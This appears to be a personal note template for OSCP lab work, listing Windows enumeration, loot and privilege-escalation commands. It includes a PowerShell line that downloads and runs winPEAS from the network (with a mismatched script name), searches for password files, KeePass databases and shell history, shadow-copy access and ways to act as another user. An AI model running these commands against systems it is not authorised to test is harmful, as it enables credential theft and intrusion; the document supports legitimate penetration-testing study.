<% tp.file.rename("0_SystemChecklist")%>

# Enumeration

```bash
mkdir /oscp/lab/x
```

```bash
i="$hip";sudo nmap --osscan-guess -T 5 -A -p- $i -oX - | xsltproc -o 0_overview.html - && firefox 0_overview.html && sudo nmap -T 5 -sUV --top-ports 100 $i -oN 0_udp_top100.txt
```

> Then, create services templates.

# Initial Foothold

##### Utilized software versions
```

```
`searchsploit` and Google Dorks
##### NSE scripts
```bash
ls /usr/share/nmap/scripts
```

> Also, use the service templates
# Loot

Hostname `hostname`
	
##### Users
```powershell
Get-LocalUser
```
Alternative: `net user`
##### Network
```powershell
ipconfig /all; route print; netstat -ano; netsh advfirewall show currentprofile, netsh advfirewall firewall show rule name=all
```
	
##### Interesting files
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -Include *password* -Include proof.txt -Include local.txt -Include sysprep.inf -Include Unattended.xml -File -Recurse -ErrorAction SilentlyContinue; Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue; Get-History; (Get-PSReadlineOption).HistorySavePath | cat - ; 
```
	
##### Home folder
```powershell
Get-ChildItem -Recurse -Path C:\Users\offsec | select Parent,Name
```
	
Alternative: `dir /B /S /A-D`
##### Advanced
Mounted Volumes: `mountvol`
Devices: `Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer`
Drivers: `driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object "Display Name", "Start Mode", "Path"`
Shadow Copy: `vssadmin list shadows`, `mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\`
# PrivEsc
##### Find Working Dir for attack
```powershell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
	

WinPEAS
```bash
IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1'); ./linpeash.ps1 -a -r | tee linpeas.txt
```
Read it with color-highlighting using `less -r linpeas.txt`

> I still have to run WinPEAS once and check what additional commands I need to integrate from [[2_loot-privEsc_Windows_Manually]]


Consider [[3_dllHijacking_guide]]

Ways to login as another user:
- If we have access to the GUI -> `RunAs /user:$user cmd`
- User is in group _Remote Desktop Users_ -> RDP
- User is in group _Remote Management Users_ -> WinRM (Better use [evil-winrm](https://github.com/Hackplayers/evil-winrm) from non-interactive shells)
- User has _Log on as a batch job_ right -> Schedule task to execute a program of our choice as this user
- User has active session -> Use PsExec (SysInternals)